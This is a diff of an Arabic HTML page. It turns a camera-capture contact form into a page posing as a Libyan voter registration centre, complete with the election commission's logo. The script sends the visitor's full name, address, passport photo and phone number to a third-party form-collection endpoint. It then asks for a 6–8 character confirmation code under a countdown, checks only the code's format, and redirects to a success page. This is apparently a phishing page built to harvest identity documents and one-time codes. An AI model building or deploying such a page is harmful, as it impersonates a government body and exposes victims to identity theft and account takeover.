@@ -1,88 +1,237 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>نموذج مع صورة</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>مركز تسجيل الناخبين - ليبيا</title>
   <style>
     body {
-      direction: rtl;
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      padding: 20px;
+      font-family: 'Arial', sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .form-container {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 460px;
+      border-top: 8px solid #003366;
+      position: relative;
+    }
+
+    .logo {
       text-align: center;
+      margin-bottom: 20px;
     }
-    video, canvas {
-      width: 100%;
-      max-width: 300px;
-      border: 1px solid #ccc;
-      margin: 10px 0;
+
+    .logo img {
+      max-width: 120px;
+      height: auto;
     }
-    input, textarea, button {
+
+    h2 {
+      text-align: center;
+      color: #003366;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
       display: block;
+      margin-bottom: 6px;
+      color: #333;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="file"] {
       width: 100%;
-      max-width: 400px;
-      margin: 10px auto;
       padding: 10px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background-color: #fff;
+    }
+
+    input:disabled {
+      background-color: #eee;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #003366;
+      border: none;
+      color: #fff;
       font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #002244;
+    }
+
+    .code-popup {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: #ffffff;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+      display: none;
+      width: 300px;
+      z-index: 1000;
+    }
+
+    .code-popup h4 {
+      margin-top: 0;
+      margin-bottom: 10px;
+      color: #003366;
+    }
+
+    .code-popup input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .code-popup .error {
+      color: red;
+      font-size: 13px;
+      display: none;
+    }
+
+    .countdown {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 10px;
     }
   </style>
 </head>
 <body>
 
-  <h2>📷 نموذج إرسال مع صورة</h2>
+<div class="form-container">
+  <div class="logo">
+    <!-- شعار مركز الانتخابات -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/High_Election_Commission_of_Libya_logo.png/200px-High_Election_Commission_of_Libya_logo.png" alt="شعار مركز الانتخابات">
+  </div>
+  <h2>مركز تسجيل الناخبين - ليبيا</h2>
+  <form id="userForm">
+    <div class="form-group">
+      <label for="name">الاسم الكامل</label>
+      <input type="text" id="name" name="name" required />
+    </div>
 
-  <!-- تشغيل الكاميرا -->
-  <video id="video" autoplay playsinline></video>
-  <button onclick="takePhoto()">📸 التقاط صورة</button>
+    <div class="form-group">
+      <label for="address">العنوان</label>
+      <input type="text" id="address" name="address" required />
+    </div>
 
-  <!-- النموذج -->
-  <form id="form" action="https://formspree.io/f/xyzjqzpo" method="POST" enctype="multipart/form-data">
-    <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
-    <textarea name="message" placeholder="اكتب رسالتك هنا" required></textarea>
+    <div class="form-group">
+      <label for="passport">صورة جواز السفر</label>
+      <input type="file" id="passport" name="passport" accept="image/*" required />
+    </div>
 
-    <!-- حقل صورة مخفي يتم تعبئته تلقائيًا -->
-    <input type="file" name="photo" id="fileInput" style="display:none;" required>
+    <div class="form-group">
+      <label for="phone">رقم الهاتف (لإستلام كود التأكيد)</label>
+      <input type="tel" id="phone" name="phone" placeholder="2189XXXXXXXX" required />
+    </div>
 
-    <button type="submit">📤 إرسال النموذج</button>
+    <button type="submit">إرسال البيانات</button>
   </form>
+</div>
 
-  <canvas id="canvas" style="display: none;"></canvas>
+<!-- نافذة الكود -->
+<div class="code-popup" id="codePopup">
+  <h4>أدخل كود التأكيد</h4>
+  <div class="countdown" id="countdown">08:00</div>
+  <input type="text" id="confirmCode" maxlength="8" placeholder="6 إلى 8 أحرف أو أرقام" />
+  <div class="error" id="codeError">يرجى إدخال كود مكوّن من 6 إلى 8 رموز فقط.</div>
+  <button onclick="validateCode()">تأكيد الكود</button>
+</div>
 
-  <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const fileInput = document.getElementById("fileInput");
-    const form = document.getElementById("form");
+<script>
+  const form = document.getElementById('userForm');
+  const codePopup = document.getElementById('codePopup');
+  const confirmCodeInput = document.getElementById('confirmCode');
+  const codeError = document.getElementById('codeError');
+  const countdownEl = document.getElementById('countdown');
+  let countdownInterval;
 
-    // تفعيل الكاميرا
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(error => alert("تعذر تشغيل الكاميرا: " + error.message));
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
 
-    // التقاط صورة وتعبئة input[type=file]
-    function takePhoto() {
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const formData = new FormData(form);
 
-      canvas.toBlob(blob => {
-        const file = new File([blob], "photo.png", { type: "image/png" });
-        const dt = new DataTransfer();
-        dt.items.add(file);
-        fileInput.files = dt.files;
-        alert("✅ تم التقاط الصورة. يمكنك الآن إرسال النموذج.");
-      }, "image/png");
-    }
+    try {
+      const response = await fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
+        method: 'POST',
+        body: formData
+      });
 
-    // التحقق من وجود صورة قبل الإرسال
-    form.addEventListener("submit", e => {
-      if (!fileInput.files.length) {
-        e.preventDefault();
-        alert("❗ من فضلك التقط صورة قبل الإرسال.");
+      if (response.ok) {
+        Array.from(form.elements).forEach(el => el.disabled = true);
+        codePopup.style.display = 'block';
+        startCountdown(8 * 60);
+      } else {
+        alert("فشل في إرسال البيانات، حاول لاحقًا.");
       }
-    });
-  </script>
+    } catch (error) {
+      alert("حدث خطأ في الاتصال.");
+      console.error(error);
+    }
+  });
+
+  function validateCode() {
+    const code = confirmCodeInput.value.trim();
+
+    if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
+      codeError.style.display = 'none';
+      confirmCodeInput.disabled = true;
+      window.location.href = "success.html"; // صفحة النجاح
+    } else {
+      codeError.style.display = 'block';
+    }
+  }
+
+  function startCountdown(seconds) {
+    let remaining = seconds;
+
+    countdownInterval = setInterval(() => {
+      let mins = Math.floor(remaining / 60);
+      let secs = remaining % 60;
+      countdownEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+
+      if (remaining <= 0) {
+        clearInterval(countdownInterval);
+        confirmCodeInput.disabled = true;
+        codeError.textContent = "انتهى وقت الكود. الرجاء المحاولة من جديد.";
+        codeError.style.display = 'block';
+      }
+
+      remaining--;
+    }, 1000);
+  }
+</script>
 
 </body>
 </html>
